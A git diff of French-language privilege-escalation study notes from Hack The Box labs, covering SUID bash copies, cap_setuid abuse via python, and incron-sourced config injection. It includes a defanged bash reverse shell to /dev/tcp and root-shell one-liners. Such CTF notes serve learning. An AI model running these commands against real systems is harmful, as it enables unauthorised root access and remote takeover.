@@ -33,7 +33,7 @@ cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash   # ← DOIT être exécut�
 ```
 puis, depuis mon shell faible : `/tmp/rootbash -p` → shell euid root.
 - **Le `-p` est OBLIGATOIRE** : sans lui, bash largue ses privilèges au démarrage ; `-p` (*privileged mode*) garde l'euid root.
-- **C'est ROOT qui doit faire le `cp`+`chmod`** : si je le fais moi-même, la copie m'appartient → SUID inutile. D'où l'astuce de glisser ces 2 lignes dans un fichier exécuté par root (cf. **Connected** : `/etc/dahdi/init.conf` sourcé par un service root).
+- **C'est ROOT qui doit faire le `cp`+`chmod`** : si je le fais moi-même, la copie m'appartient → SUID inutile. D'où l'astuce de glisser ces 2 lignes dans un fichier exécuté par root (ex. une config sourcée par un service root à son redémarrage).
 - Équivalence conceptuelle avec `cap_setuid` (voir `getcap`) : deux chemins, une destination = forcer euid 0.
 
 **Pièges & leçons**
@@ -148,9 +148,9 @@ id     # uid=0(root)
 
 **Exemple vécu**
 - **Cap** (HTB Easy) : `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` (repéré par linpeas). L'appli web faisait déjà `os.setuid(0)` dans son code → l'indice était là → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` → **root**. Note : `uid=0(root) gid=1001(...)` car `setuid` seul (pas `setgid`).
-- **Connected** — *CONTRE-exemple* : `getcap` sortait `/usr/sbin/suexec = cap_setgid,cap_setuid+ep` **mais PAS exploitable**. suexec (helper Apache) est **durci** : refuse un appelant non-httpd, refuse les UID bas (donc root), docroot compilé → il ne te laisse PAS diriger son `setuid`. Idem `newuidmap`/`newgidmap` et tous les `cap_net_raw` (`dumpcap`/`ping`/`mtr` = valeurs par défaut, pas des misconfigs).
+- *CONTRE-exemple* : `getcap` sortait `/usr/sbin/suexec = cap_setgid,cap_setuid+ep` **mais PAS exploitable**. suexec (helper Apache) est **durci** : refuse un appelant non-httpd, refuse les UID bas (donc root), docroot compilé → il ne te laisse PAS diriger son `setuid`. Idem `newuidmap`/`newgidmap` et tous les `cap_net_raw` (`dumpcap`/`ping`/`mtr` = valeurs par défaut, pas des misconfigs).
 
-**La règle (Cap vs Connected) : une capability n'est exploitable QUE si le binaire te laisse EXÉCUTER DU CODE ARBITRAIRE.**
+**La règle : une capability n'est exploitable QUE si le binaire te laisse EXÉCUTER DU CODE ARBITRAIRE.**
 
 | Binaire | `cap_setuid` ? | Root ? | Pourquoi |
 |---|---|---|---|
@@ -188,10 +188,10 @@ Beaucoup de privesc de ce type ne consistent PAS à écrire directement dans le 
 > LE TEST-ROI avant de planquer quoi que ce soit : *« le service qui relit cette config, il tourne en tant que QUI ? »* Si c'est un process non-root, je ne gagne rien. Le payload ne vaut de l'or que si le lecteur est **root** (`ps aux | grep <service>`).
 
 **Exemple vécu**
-- **Connected** (HTB Medium) : `incrond` (root) surveille un dossier 777 appartenant à `asterisk`. Écrire un fichier déclencheur → root relance un service → qui **source** une config writable par `asterisk` **en root**. J'y ai mis un reverse shell (défangé : `bash -i >& /dev/tcp/IP/PORT 0>&1`) → `touch <déclencheur>` → **shell root**.
+- **Exemple (générique)** : `incrond` (root) surveille un dossier world-writable. Écrire un fichier déclencheur → un service root redémarre → il **source** une config elle-même writable → le tout en root. J'y place un reverse shell (défangé : `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`) → `touch <déclencheur>` → **shell root**.
 - *Contre-exemple digéré* (même box) : les autres règles incron lançaient des commandes fixes qui n'ouvrent jamais mon fichier = culs-de-sac. Seule compte la ligne où mon écriture rejoint l'exécution root.
 
-**Lire une "forteresse" de hook (bonus Connected)** — un dispatcher qui finit par `system("$hookfile $params")` MAIS vérifie que le hook est **signé GPG** (whitelist) + **hash intègre** → impossible de planter mon propre hook. Leçon : contre un rempart de signature/intégrité, on ne casse pas les murs → on cherche le seul paramètre laissé passer (`$params`, au filtre incomplet) ou un autre chemin (ici la config sourcée).
+**Lire une "forteresse" de hook** — un dispatcher qui finit par `system("$hookfile $params")` MAIS vérifie que le hook est **signé GPG** (whitelist) + **hash intègre** → impossible de planter mon propre hook. Leçon : contre un rempart de signature/intégrité, on ne casse pas les murs → on cherche le seul paramètre laissé passer (`$params`, au filtre incomplet) ou un autre chemin (ici la config sourcée).
 
 **Pièges & leçons**
 - **`find -perm` et `getcap` ne voient PAS incron.** Vecteur à part → `cat /etc/incron.d/*` (linpeas le remonte dans *Cron jobs / incron*).
